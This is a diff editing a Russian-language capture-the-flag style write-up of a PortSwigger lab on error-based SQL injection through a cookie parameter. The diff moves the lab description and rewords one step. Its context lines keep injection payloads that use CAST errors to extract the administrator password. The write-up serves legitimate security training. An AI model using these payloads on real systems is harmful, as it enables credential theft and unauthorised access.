@@ -11,16 +11,11 @@ header:
       url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based"
 ---
 
-Пост из пака **union_sqli**.
-
-## Scope
+В данной лабе присутствует **Error based SQL injection** в параметре `Cookie`. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.
 
 ```
 https://0a75008704f2164580726c3600ac0013.web-security-academy.net/
 ```
-
-В данной лабе присутствует **Error based  SQL injection** в параметре `Cookie`. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.
-
 
 ## Solution
 
@@ -91,7 +86,7 @@ dUrA4au9zQX6dlb5' and 1=CAST((SELECT 'a') AS int)-- -Error
 
 ![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/4.png){: height="200" .align-center}
 
-Получу пароль таким же образом:
+Достану пароль таким же образом:
 
 ```
 ' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
